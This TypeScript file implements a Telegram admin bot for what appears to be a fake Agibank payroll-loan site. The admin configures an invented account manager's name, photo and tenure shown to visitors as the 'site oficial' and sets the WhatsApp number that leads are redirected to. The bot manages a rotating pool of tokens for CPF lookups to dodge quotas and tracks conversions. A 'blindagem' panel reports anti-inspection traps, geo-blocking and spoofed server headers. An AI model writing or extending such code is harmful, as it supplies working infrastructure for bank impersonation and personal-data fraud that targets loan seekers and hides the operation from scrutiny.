import { addApiToken, getConfig, removeApiToken, updateConfig } from "./bot-config";
import { getMetrics, resetMetrics } from "./system-metrics";
import { brl } from "./loan";

// ─────────────────────────────────────────────────────────────────────────────
// Estado conversacional persistido no isolate global do Cloudflare Worker.
// Em Workers, o isolate pode ser reusado em múltiplos requests da MESMA instância,
// mas pode haver múltiplas instâncias. Para single-admin bots isso é suficiente.
// A chave de robustez aqui: o estado é também codificado na callback_data dos
// botões de cancelar (ex: "cancel_AWAITING_WHATSAPP"), garantindo que mesmo
// numa instância nova o contexto é recuperado pelo botão.
// ─────────────────────────────────────────────────────────────────────────────

type AdminExpectation =
  | "AWAITING_WHATSAPP"
  | "AWAITING_NOME"
  | "AWAITING_AVATAR"
  | "AWAITING_ANO"
  | "AWAITING_TOKEN_ADD"
  | "AWAITING_TOKEN_DEL"
  | null;

// Estado global no isolate — sobrevive entre requests no mesmo worker aquecido
declare global {
  var __adminState: AdminExpectation;
  var __adminStateTs: number;
}
globalThis.__adminState = globalThis.__adminState ?? null;
globalThis.__adminStateTs = globalThis.__adminStateTs ?? 0;

// Expiração: se não houve interação por 5 minutos, reseta o estado
const STATE_TTL_MS = 5 * 60 * 1000;

function getAdminState(): AdminExpectation {
  const age = Date.now() - (globalThis.__adminStateTs ?? 0);
  if (age > STATE_TTL_MS) {
    globalThis.__adminState = null;
  }
  return globalThis.__adminState ?? null;
}

function setAdminState(state: AdminExpectation) {
  globalThis.__adminState = state;
  globalThis.__adminStateTs = Date.now();
}

// ─────────────────────────────────────────────────────────────────────────────
// Renderização do preview do gerente
// ─────────────────────────────────────────────────────────────────────────────
function renderManagerPreviewText(cfg: ReturnType<typeof getConfig>): string {
  const sampleAmount = 18450.0;
  const sampleProtocol = "AGI" + Math.floor(100000 + Math.random() * 900000);
  const waUrl = `https://wa.me/${cfg.whatsappNumber}?text=${encodeURIComponent("Preciso de um atendimento Humanizado de AgiBank")}`;

  return [
    `<b>📱 PREVIEW REAL DA TELA DO CLIENTE (ETAPA DO GERENTE)</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<i>Assim é exatamente como o cliente vê seu gerente no site oficial:</i>\n`,
    `🖼️ <b>Foto/Avatar:</b> <code>${cfg.managerAvatarUrl}</code>`,
    `👤 <b>Gerente de Contas:</b> <b>${cfg.managerName}</b>`,
    `💼 <b>Cargo:</b> <i>Especialista em Crédito Consignado INSS · Agibank</i>`,
    `📅 <b>Tempo de Agibank:</b> Desde ${cfg.companyYears}`,
    `🏷️ <b>Status:</b> 🟢 <b>Online e Disponível Agora</b>`,
    ``,
    `💬 <b>MENSAGEM AO CLIENTE NA TELA:</b>`,
    `<i>"Olá! Vou cuidar pessoalmente da sua proposta de <b>${brl(sampleAmount)}</b>, da conferência dos documentos até a liberação do valor."</i>`,
    ``,
    `🛡️ <b>Protocolo Gerado:</b> <code>${sampleProtocol}</code>`,
    `📲 <b>Botão de Ação do Lead:</b> [🟢 Ir para Atendimento]`,
    `🔗 <b>Link Direto de Redirecionamento:</b> <code>${waUrl}</code>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
  ].join("\n");
}

// ─────────────────────────────────────────────────────────────────────────────
// Renderização das métricas avançadas
// ─────────────────────────────────────────────────────────────────────────────
function renderAdvancedMetricsText(): string {
  const m = getMetrics();
  const convRate = m.totalVisits > 0 ? ((m.totalConversions / m.totalVisits) * 100).toFixed(1) : "0.0";
  const dropRate = m.totalVisits > 0 ? ((m.totalAbandons / m.totalVisits) * 100).toFixed(1) : "0.0";

  let totalApiCost = 0;
  const tokenLines: string[] = [];

  for (const [tokenKey, data] of Object.entries(m.tokenUsage)) {
    totalApiCost += data.costPaid;
    tokenLines.push(`• <code>${tokenKey}</code>: <b>${data.queries} consultas</b> | Taxa: <b>R$ ${data.costPaid.toFixed(2)}</b>`);
  }

  const tokenListText =
    tokenLines.length > 0
      ? tokenLines.join("\n")
      : "<i>Nenhuma consulta com token cobrada ainda.</i>";

  return [
    `<b>📈 DASHBOARD AVANÇADO DE MÉTRICAS & FINANÇAS</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<b>🚦 FUNIL DE TRÁFEGO EM TEMPO REAL:</b>`,
    `• <b>Entradas Totais (Sessões):</b> <b>${m.totalVisits}</b>`,
    `• <b>Simulações Iniciadas:</b> <b>${m.totalSimulations}</b>`,
    `• <b>Propostas Calculadas:</b> <b>${m.totalProposals}</b>`,
    `• <b>Saídas / Abandonos:</b> <b>${m.totalAbandons}</b> (Taxa: <code>${dropRate}%</code>)`,
    Object.keys(m.abandonsByStep || {}).length > 0
      ? `  └ <i>Desistências por Etapa:</i>\n` +
        Object.entries(m.abandonsByStep)
          .map(([st, cnt]) => `     • <code>${st}</code>: ${cnt} abandono(s)`)
          .join("\n")
      : "",
    `• <b>Conversões (WhatsApp):</b> <b>${m.totalConversions}</b>`,
    `• <b>Taxa Global de Conversão:</b> 🟢 <b>${convRate}%</b>`,
    ``,
    `<b>💰 FINANCEIRO & VOLUME LIBERADO:</b>`,
    `• <b>Volume Total Gerado (Pré-Aprovado):</b> <b>${brl(m.totalRevenueGenerated)}</b>`,
    `• <b>Volume Confirmado (Conversão Lead):</b> <b>${brl(m.totalRevenueConfirmed)}</b>`,
    ``,
    `<b>🔑 CONSUMO & TAXAS DE APIS DA RECEITA:</b>`,
    `• <b>Consultas Totais Solicitadas:</b> <b>${m.apiQueriesCount}</b>`,
    `• <b>Consultas no Cache (Custo R$ 0,00):</b> <b>${m.apiCachedQueriesCount}</b>`,
    `• <b>Custo Total em Taxas de API:</b> <b>R$ ${totalApiCost.toFixed(2)}</b>`,
    ``,
    `<b>📊 CONSUMO POR TOKEN DO HUB:</b>`,
    tokenListText,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<i>Atualizado em tempo real: ${new Date().toLocaleTimeString("pt-BR", { timeZone: "America/Sao_Paulo" })}</i>`,
  ].join("\n");
}

// ─────────────────────────────────────────────────────────────────────────────
// Função auxiliar: teclado do gerente
// ─────────────────────────────────────────────────────────────────────────────
function gerenteKeyboard(waUrl: string) {
  return [
    [{ text: "👁️ Ver Preview Real da Tela", callback_data: "btn_preview_gerente" }],
    [{ text: "💬 Testar WhatsApp do Gerente", url: waUrl }],
    [
      { text: "✏️ Alterar WhatsApp", callback_data: "act_change_whatsapp" },
      { text: "✏️ Alterar Nome",     callback_data: "act_change_name" },
    ],
    [
      { text: "🖼️ Alterar Foto/Avatar", callback_data: "act_change_avatar" },
      { text: "📅 Alterar Ano",         callback_data: "act_change_year" },
    ],
    [{ text: "⬅️ Voltar ao Painel", callback_data: "menu_principal" }],
  ];
}

// ─────────────────────────────────────────────────────────────────────────────
// Handler principal do webhook
// ─────────────────────────────────────────────────────────────────────────────
export async function handleTelegramUpdate(body: any): Promise<boolean> {
  const token   = process.env["TELEGRAM_BOT_TOKEN"];
  const adminId = process.env["TELEGRAM_ADMIN_CHAT_ID"];

  if (!token || !adminId) return false;

  // ── Helpers de comunicação ──────────────────────────────────────────────
  const reply = async (text: string, inlineKeyboard?: any[][]) => {
    try {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          chat_id: adminId,
          text,
          parse_mode: "HTML",
          reply_markup: inlineKeyboard ? { inline_keyboard: inlineKeyboard } : undefined,
        }),
      });
    } catch (e) {
      console.error("[Telegram Bot] Erro ao enviar mensagem:", e);
    }
  };

  const answerCallback = async (callbackQueryId: string, alertText?: string) => {
    try {
      await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          callback_query_id: callbackQueryId,
          text: alertText,
          show_alert: Boolean(alertText),
        }),
      });
    } catch (e) {
      console.error("[Telegram Bot] Erro no answerCallbackQuery:", e);
    }
  };

  // ── 1. Callback Queries (clique em botões inline) ───────────────────────
  if (body.callback_query) {
    const cb       = body.callback_query;
    const senderId = String(cb.from.id);
    const data     = cb.data as string;

    if (senderId !== String(adminId)) {
      await answerCallback(cb.id, "⛔ Acesso negado! Apenas o Admin Supremo pode gerenciar o sistema.");
      return true;
    }

    await answerCallback(cb.id);

    // Menu principal / cancelar qualquer estado pendente
    if (data === "menu_principal" || data.startsWith("cancel_")) {
      setAdminState(null);
      return sendMainMenu(reply);
    }

    // ── Dashboard de Métricas ───────────────────────────────────────────
    if (data === "btn_metricas") {
      await reply(renderAdvancedMetricsText(), [
        [
          { text: "🔄 Atualizar Métricas",  callback_data: "btn_metricas" },
          { text: "🗑️ Zerar Métricas",      callback_data: "act_zerar_metricas" },
        ],
        [{ text: "⬅️ Voltar ao Painel", callback_data: "menu_principal" }],
      ]);
      return true;
    }

    if (data === "act_zerar_metricas") {
      resetMetrics();
      await reply("✅ <b>Métricas zeradas com sucesso!</b> Novo ciclo iniciado.", [
        [{ text: "📊 Ver Métricas",    callback_data: "btn_metricas" }],
        [{ text: "⬅️ Menu Principal", callback_data: "menu_principal" }],
      ]);
      return true;
    }

    // ── Preview do Gerente ──────────────────────────────────────────────
    if (data === "btn_preview_gerente") {
      const cfg   = getConfig();
      const waUrl = `https://wa.me/${cfg.whatsappNumber}?text=${encodeURIComponent("Preciso de um atendimento Humanizado de AgiBank")}`;
      await reply(renderManagerPreviewText(cfg), [
        [{ text: "💬 Testar Ação do WhatsApp (Como o Lead Vê)", url: waUrl }],
        [
          { text: "✏️ Alterar WhatsApp", callback_data: "act_change_whatsapp" },
          { text: "✏️ Alterar Nome",     callback_data: "act_change_name" },
        ],
        [
          { text: "🖼️ Alterar Foto/Avatar", callback_data: "act_change_avatar" },
          { text: "📅 Alterar Ano",         callback_data: "act_change_year" },
        ],
        [{ text: "⬅️ Voltar ao Painel", callback_data: "menu_principal" }],
      ]);
      return true;
    }

    // ── Painel do Gerente ───────────────────────────────────────────────
    if (data === "btn_gerente") {
      const cfg   = getConfig();
      const waUrl = `https://wa.me/${cfg.whatsappNumber}?text=${encodeURIComponent("Preciso de um atendimento Humanizado de AgiBank")}`;
      const msg = [
        `<b>👤 GESTÃO DO PERFIL DO GERENTE & CONTATO</b>`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<b>• Nome Atual:</b> <b>${cfg.managerName}</b>`,
        `<b>• WhatsApp Atual:</b> <code>${cfg.whatsappNumber}</code>`,
        `<b>• Foto/Avatar:</b> <code>${cfg.managerAvatarUrl}</code>`,
        `<b>• Ano de Empresa:</b> <code>${cfg.companyYears}</code>`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<i>Escolha uma das ações abaixo:</i>`,
      ].join("\n");
      await reply(msg, gerenteKeyboard(waUrl));
      return true;
    }

    // ── Pool de Tokens ──────────────────────────────────────────────────
    if (data === "btn_tokens") {
      const cfg  = getConfig();
      const list =
        cfg.apiTokens.length > 0
          ? cfg.apiTokens.map((t, i) => `<b>${i + 1}.</b> <code>${t}</code>`).join("\n")
          : "<i>Nenhum token cadastrado no pool atualmente.</i>";
      const msg = [
        `<b>🔑 POOL DE TOKENS DA API CPF</b>`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<b>Status:</b> ${cfg.apiTokens.length > 0 ? "🟢 Operante com Rotação Ativa" : "🔴 Sem tokens cadastrados"}`,
        `<b>Total de Tokens Ativos:</b> <b>${cfg.apiTokens.length}</b>`,
        ``,
        list,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<i>O sistema alterna automaticamente entre os tokens para não estourar a cota da Receita.</i>`,
      ].join("\n");
      await reply(msg, [
        [
          { text: "➕ Adicionar Token", callback_data: "act_add_token" },
          { text: "🗑️ Remover Token",  callback_data: "act_del_token" },
        ],
        [{ text: "⬅️ Voltar ao Painel", callback_data: "menu_principal" }],
      ]);
      return true;
    }

    // ── Acionar estados de espera ───────────────────────────────────────
    if (data === "act_change_whatsapp") {
      setAdminState("AWAITING_WHATSAPP");
      await reply(
        `⏳ <b>AGUARDANDO NOVO NÚMERO DE WHATSAPP</b>\n\n` +
        `Envie agora o novo número com DDD (ex: <code>11988887777</code> ou <code>5511988887777</code>).\n\n` +
        `💡 <i>Não se preocupe com parênteses ou traços, o sistema formata tudo automaticamente!</i>\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_WHATSAPP" }]]
      );
      return true;
    }

    if (data === "act_change_name") {
      setAdminState("AWAITING_NOME");
      await reply(
        `⏳ <b>AGUARDANDO NOVO NOME DO GERENTE</b>\n\n` +
        `Envie o nome que deseja exibir na tela final e nas mensagens (ex: <code>Carlos Eduardo</code>).\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_NOME" }]]
      );
      return true;
    }

    if (data === "act_change_avatar") {
      setAdminState("AWAITING_AVATAR");
      await reply(
        `⏳ <b>AGUARDANDO NOVO AVATAR/FOTO DO GERENTE</b>\n\n` +
        `📸 <b>Você pode enviar de duas formas:</b>\n` +
        `1. <b>Envie uma foto/imagem anexada diretamente aqui no chat</b> (o bot processa e aplica na hora!)\n` +
        `2. <b>Ou envie um link web direto</b> (ex: <code>https://...imagem.png</code>)\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_AVATAR" }]]
      );
      return true;
    }

    if (data === "act_change_year") {
      setAdminState("AWAITING_ANO");
      await reply(
        `⏳ <b>AGUARDANDO ANO DA EMPRESA</b>\n\n` +
        `Envie o ano com 4 dígitos (ex: <code>2026</code>).\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_ANO" }]]
      );
      return true;
    }

    if (data === "act_add_token") {
      setAdminState("AWAITING_TOKEN_ADD");
      await reply(
        `⏳ <b>AGUARDANDO NOVO TOKEN DA API CPF</b>\n\n` +
        `Envie o código do token fornecido pelo Hub do Desenvolvedor.\n\n` +
        `💡 <i>Exemplo: 220922290qQOczpuFIP398868496</i>\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_TOKEN_ADD" }]]
      );
      return true;
    }

    if (data === "act_del_token") {
      setAdminState("AWAITING_TOKEN_DEL");
      await reply(
        `⏳ <b>AGUARDANDO TOKEN PARA REMOÇÃO</b>\n\n` +
        `Envie o código exato do token que você deseja desativar do pool.\n\n` +
        `❌ Para cancelar, clique no botão abaixo.`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_TOKEN_DEL" }]]
      );
      return true;
    }

    if (data === "btn_blindagem" || data === "btn_tst_blindagem") {
      await reply(
        `<b>🛡️ STATUS DA BLINDAGEM SUPREMA DO SISTEMA</b>\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
        `• <b>Anti-Scraping & Anti-Copy:</b> 🟢 Ativo (Bloqueio total de seleção, arrasto e cópia)\n` +
        `• <b>DevTools Trap & Debugger:</b> 🟢 Ativo (Congelamento imediato de tentativas de inspeção)\n` +
        `• <b>WAF & Geo-Shield:</b> 🟢 Ativo (Tráfego restrito a conexões autorizadas do Brasil)\n` +
        `• <b>DDoS Rate Limiter L7:</b> 🟢 Ativo (45 req/min com bloqueio temporário escalável)\n` +
        `• <b>Camuflagem de Servidor:</b> 🟢 Ativo (Ocultação de headers reais / spoofing Cloudflare)\n` +
        `• <b>Content-Security-Policy:</b> 🟢 Ativo (frame-ancestors 'none', X-Frame-Options DENY)\n` +
        `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        [
          [{ text: "🔄 Atualizar Status",    callback_data: "btn_tst_blindagem" }],
          [{ text: "⬅️ Voltar ao Painel",    callback_data: "menu_principal" }],
        ]
      );
      return true;
    }

    if (data.startsWith("status_") || data.startsWith("time_")) {
      const isStatus = data.startsWith("status_");
      await answerCallback(
        cb.id,
        isStatus
          ? "📊 Este selo indica o status calculado em tempo real pelo Lead Scoring."
          : "⏱️ Tempo ativo que este visitante permaneceu no funil do site."
      );
      return true;
    }

    return true;
  }

  // ── 2. Mensagens de texto / mídia ─────────────────────────────────────────
  const message = body.message;
  if (!message) return false;

  const senderId = String(message.chat?.id || message.from?.id);
  const rawText  = (message.text || message.caption || "").trim();

  if (senderId !== String(adminId)) return false;

  // ── 2.1 Foto ou imagem anexada ──────────────────────────────────────────
  const photos   = message.photo as Array<{ file_id: string; width: number; height: number }> | undefined;
  const doc      = message.document as { file_id: string; mime_type?: string } | undefined;
  const isImgDoc = doc?.mime_type?.startsWith("image/");

  if (photos || isImgDoc) {
    const fileId = photos?.length ? photos[photos.length - 1]?.file_id : doc?.file_id;
    if (fileId) {
      try {
        const fileInfoRes = await fetch(`https://api.telegram.org/bot${token}/getFile?file_id=${fileId}`);
        const fileInfo    = (await fileInfoRes.json()) as { ok: boolean; result?: { file_path: string } };

        if (fileInfo.ok && fileInfo.result?.file_path) {
          const directUrl    = `https://api.telegram.org/file/bot${token}/${fileInfo.result.file_path}`;
          const updatedCfg   = updateConfig({ managerAvatarUrl: directUrl });
          setAdminState(null);

          const previewMsg =
            `🎉 <b>SUCESSO! FOTO/AVATAR ATUALIZADO VIA ANEXO</b>\n\n` +
            `A imagem que você enviou foi processada e já está visível para os clientes!\n\n` +
            renderManagerPreviewText(updatedCfg);

          await reply(previewMsg, [
            [{ text: "👁️ Ver Preview Completo",   callback_data: "btn_preview_gerente" }],
            [{ text: "⬅️ Voltar ao Menu Principal", callback_data: "menu_principal" }],
          ]);
          return true;
        }
      } catch (e) {
        console.error("[Telegram Bot] Erro ao baixar foto:", e);
      }
    }
  }

  if (!rawText) return false;

  // ── 2.2 Cancelar estado pendente ───────────────────────────────────────
  if (rawText.toLowerCase() === "cancelar" || rawText === "/cancelar") {
    setAdminState(null);
    await reply("❌ <i>Ação cancelada. Retornando ao menu principal...</i>", [
      [{ text: "📊 Menu Principal", callback_data: "menu_principal" }],
    ]);
    return sendMainMenu(reply);
  }

  // ── 2.3 Comandos diretos ───────────────────────────────────────────────
  if (rawText === "/start" || rawText === "/menu" || rawText === "/painel") {
    setAdminState(null);
    return sendMainMenu(reply);
  }

  if (rawText === "/metricas" || rawText === "/dashboard") {
    setAdminState(null);
    await reply(renderAdvancedMetricsText(), [
      [
        { text: "🔄 Atualizar Métricas", callback_data: "btn_metricas" },
        { text: "🗑️ Zerar Métricas",    callback_data: "act_zerar_metricas" },
      ],
      [{ text: "⬅️ Voltar ao Painel", callback_data: "menu_principal" }],
    ]);
    return true;
  }

  // Comandos inline rápidos
  if (rawText.startsWith("/whatsapp ")) {
    const raw  = rawText.slice(10).trim().replace(/\D/g, "");
    if (raw.length >= 10) {
      const num  = raw.startsWith("55") ? raw : `55${raw}`;
      const cfg  = updateConfig({ whatsappNumber: num });
      await reply(
        `✅ <b>WhatsApp atualizado para:</b> <code>${num}</code>\n\n` + renderManagerPreviewText(cfg),
        [
          [{ text: "👁️ Ver Preview Completo", callback_data: "btn_preview_gerente" }],
          [{ text: "⬅️ Menu Principal",        callback_data: "menu_principal" }],
        ]
      );
      return true;
    }
  }

  if (rawText.startsWith("/nome ")) {
    const n = rawText.slice(6).trim();
    if (n.length >= 2) {
      const cfg = updateConfig({ managerName: n });
      await reply(
        `✅ <b>Nome do Gerente atualizado para:</b> <b>${n}</b>\n\n` + renderManagerPreviewText(cfg),
        [
          [{ text: "👁️ Ver Preview Completo", callback_data: "btn_preview_gerente" }],
          [{ text: "⬅️ Menu Principal",        callback_data: "menu_principal" }],
        ]
      );
      return true;
    }
  }

  if (rawText.startsWith("/add_token ")) {
    const t    = rawText.slice(11).trim();
    const list = addApiToken(t);
    await reply(`✅ <b>Token adicionado ao pool!</b> Total: <b>${list.length}</b>`, [
      [{ text: "🔑 Ver Pool de Tokens", callback_data: "btn_tokens" }],
      [{ text: "⬅️ Menu Principal",    callback_data: "menu_principal" }],
    ]);
    return true;
  }

  // ── 2.4 Processamento de estado de espera (AWAITING_*) ─────────────────
  const state = getAdminState();

  if (state === "AWAITING_WHATSAPP") {
    const cleanNumber = rawText.replace(/\D/g, "");
    if (cleanNumber.length < 10 || cleanNumber.length > 15) {
      await reply(
        `❌ <b>ERRO: NÚMERO INVÁLIDO</b>\n\n` +
        `O número fornecido (<code>${rawText}</code>) não possui a quantidade correta de dígitos.\n\n` +
        `💡 <i>Envie com DDD (ex: <code>11988887777</code> ou <code>5511988887777</code>).</i>`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_WHATSAPP" }]]
      );
      return true;
    }
    const finalNumber = cleanNumber.startsWith("55") ? cleanNumber : `55${cleanNumber}`;
    const updatedCfg  = updateConfig({ whatsappNumber: finalNumber });
    setAdminState(null);
    await reply(
      `🎉 <b>SUCESSO! WHATSAPP ATUALIZADO</b>\n\nNovo número: 📱 <b>${finalNumber}</b>\n\n` +
      renderManagerPreviewText(updatedCfg),
      [
        [{ text: "👁️ Ver Preview Completo",   callback_data: "btn_preview_gerente" }],
        [{ text: "⬅️ Voltar ao Menu Principal", callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  if (state === "AWAITING_NOME") {
    if (rawText.length < 2 || rawText.length > 50) {
      await reply(
        `❌ <b>ERRO: NOME INVÁLIDO</b>\n\nO nome deve ter entre 2 e 50 caracteres.\n\n` +
        `💡 <i>Exemplo: <code>Carlos Eduardo</code></i>`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_NOME" }]]
      );
      return true;
    }
    const updatedCfg = updateConfig({ managerName: rawText });
    setAdminState(null);
    await reply(
      `🎉 <b>SUCESSO! NOME DO GERENTE ALTERADO</b>\n\nNovo gerente: <b>${rawText}</b>\n\n` +
      renderManagerPreviewText(updatedCfg),
      [
        [{ text: "👁️ Ver Preview Completo",   callback_data: "btn_preview_gerente" }],
        [{ text: "⬅️ Voltar ao Menu Principal", callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  if (state === "AWAITING_AVATAR") {
    if (!rawText.startsWith("http://") && !rawText.startsWith("https://") && !rawText.startsWith("/")) {
      await reply(
        `❌ <b>ERRO: LINK OU IMAGEM INVÁLIDA</b>\n\n` +
        `Envie uma foto anexada diretamente pelo chat ou informe um link <code>https://...</code>.\n\n` +
        `💡 <i>Você pode anexar qualquer foto da galeria aqui no chat!</i>`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_AVATAR" }]]
      );
      return true;
    }
    const updatedCfg = updateConfig({ managerAvatarUrl: rawText });
    setAdminState(null);
    await reply(
      `🎉 <b>SUCESSO! FOTO/AVATAR ATUALIZADO</b>\n\nA nova foto já está visível para os clientes!\n\n` +
      renderManagerPreviewText(updatedCfg),
      [
        [{ text: "👁️ Ver Preview Completo",   callback_data: "btn_preview_gerente" }],
        [{ text: "⬅️ Voltar ao Menu Principal", callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  if (state === "AWAITING_ANO") {
    const ano = parseInt(rawText, 10);
    if (isNaN(ano) || ano < 1900 || ano > 2100) {
      await reply(
        `❌ <b>ERRO: ANO INVÁLIDO</b>\n\nInforme um ano válido com 4 dígitos (ex: <code>2026</code>).`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_ANO" }]]
      );
      return true;
    }
    const updatedCfg = updateConfig({ companyYears: ano });
    setAdminState(null);
    await reply(
      `🎉 <b>SUCESSO! ANO DE EMPRESA ATUALIZADO</b>\n\nAno configurado: <b>${ano}</b>\n\n` +
      renderManagerPreviewText(updatedCfg),
      [
        [{ text: "👁️ Ver Preview Completo",   callback_data: "btn_preview_gerente" }],
        [{ text: "⬅️ Voltar ao Menu Principal", callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  if (state === "AWAITING_TOKEN_ADD") {
    if (rawText.length < 8) {
      await reply(
        `❌ <b>ERRO: TOKEN MUITO CURTO</b>\n\n` +
        `Os tokens costumam ter mais de 15 caracteres alfanuméricos.\n\n` +
        `💡 <i>Confira o código enviado ou cancele.</i>`,
        [[{ text: "❌ Cancelar", callback_data: "cancel_AWAITING_TOKEN_ADD" }]]
      );
      return true;
    }
    const tokens = addApiToken(rawText);
    setAdminState(null);
    await reply(
      `🎉 <b>SUCESSO! NOVO TOKEN INTEGRADO AO POOL</b>\n\n` +
      `Token: <code>${rawText}</code>\nTotal em revezamento: <b>${tokens.length}</b>\n\n` +
      `<i>O sistema distribui as consultas de CPF entre todos os tokens!</i>`,
      [
        [{ text: "🔑 Ver Pool de Tokens", callback_data: "btn_tokens" }],
        [{ text: "⬅️ Voltar ao Menu",    callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  if (state === "AWAITING_TOKEN_DEL") {
    const tokens = removeApiToken(rawText);
    setAdminState(null);
    await reply(
      `🗑️ <b>SUCESSO! TOKEN REMOVIDO DO POOL</b>\n\nTotal restante: <b>${tokens.length} tokens</b>.`,
      [
        [{ text: "🔑 Ver Pool de Tokens", callback_data: "btn_tokens" }],
        [{ text: "⬅️ Voltar ao Menu",    callback_data: "menu_principal" }],
      ]
    );
    return true;
  }

  // ── 2.5 Fallback: comando desconhecido ─────────────────────────────────
  await reply(
    `🤖 <b>Comando recebido:</b> "<i>${rawText}</i>"\n\n` +
    `💡 <i>Selecione uma das ações interativas abaixo para gerenciar o sistema:</i>`,
    [
      [
        { text: "📊 Métricas Avançadas",    callback_data: "btn_metricas" },
        { text: "👁️ Preview do Gerente",   callback_data: "btn_preview_gerente" },
      ],
      [
        { text: "👤 Gerenciar Gerente",     callback_data: "btn_gerente" },
        { text: "🔑 Tokens CPF",            callback_data: "btn_tokens" },
      ],
      [
        { text: "🛡️ Blindagem do Sistema", callback_data: "btn_blindagem" },
        { text: "👑 Menu Principal",        callback_data: "menu_principal" },
      ],
    ]
  );

  return true;
}

// ─────────────────────────────────────────────────────────────────────────────
// Menu Principal
// ─────────────────────────────────────────────────────────────────────────────
async function sendMainMenu(reply: (text: string, inlineKeyboard?: any[][]) => Promise<void>) {
  const cfg = getConfig();
  const m   = getMetrics();

  const text = [
    `<b>👑 PAINEL SUPREMO DE CONTROLE & MÉTRICAS · AGIBANK</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<b>⚙️ STATUS OPERACIONAL DO SISTEMA:</b>`,
    `• <b>Gerente Ativo:</b> <b>${cfg.managerName}</b>`,
    `• <b>WhatsApp de Recebimento:</b> <code>${cfg.whatsappNumber}</code>`,
    `• <b>Sessões Ativas no Funil:</b> <b>${m.totalVisits}</b>`,
    `• <b>Conversões no WhatsApp:</b> <b>${m.totalConversions}</b>`,
    `• <b>Tokens da Receita Ativos:</b> <b>${cfg.apiTokens.length}</b>`,
    `• <b>Blindagem & Anti-Cópia:</b> 🟢 <b>100% Blindado</b>`,
    `━━━━━━━━━━━━━━━━━━━━━━━━━━━`,
    `<i>Selecione uma ação para gerenciar:</i>`,
  ].join("\n");

  await reply(text, [
    [
      { text: "📈 Métricas Avançadas & Renda",   callback_data: "btn_metricas" },
      { text: "👁️ Preview Real do Gerente",      callback_data: "btn_preview_gerente" },
    ],
    [
      { text: "👤 Gerenciar Contato & Gerente",  callback_data: "btn_gerente" },
      { text: "🔑 Gerenciar Tokens CPF",          callback_data: "btn_tokens" },
    ],
    [
      { text: "🛡️ Status da Blindagem",          callback_data: "btn_blindagem" },
    ],
  ]);
  return true;
}
